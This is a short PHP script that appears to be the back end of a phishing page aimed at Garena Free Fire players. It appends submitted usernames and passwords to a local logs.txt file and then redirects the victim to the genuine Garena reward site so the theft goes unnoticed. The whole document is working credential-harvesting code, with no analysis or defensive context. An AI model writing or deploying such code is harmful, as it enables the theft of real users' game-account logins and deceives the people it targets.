<?php
file_put_contents("logs.txt", "User: ".$_POST['username']." | Pass: ".$_POST['password']."\n", FILE_APPEND);
header('Location: https://reward.ff.garena.com');
exit();
?>
